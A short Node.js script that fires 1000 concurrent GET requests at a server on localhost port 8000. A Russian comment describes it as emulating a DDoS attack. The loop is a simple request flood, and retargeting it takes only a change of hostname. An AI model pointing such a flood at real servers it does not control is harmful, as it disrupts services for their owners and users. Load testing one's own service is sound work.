const http = require('http');

const options = {
    hostname: 'localhost',
    port: 8000,
    path: '/',
    method: 'GET'
};

function sendRequest() {
    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Обработка полученных данных
        });
        res.on('end', () => {
            // Запрос завершен
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Отправка большого количества запросов для эмуляции DDoS-атаки
for (let i = 0; i < 1000; i++) {
    sendRequest();
}
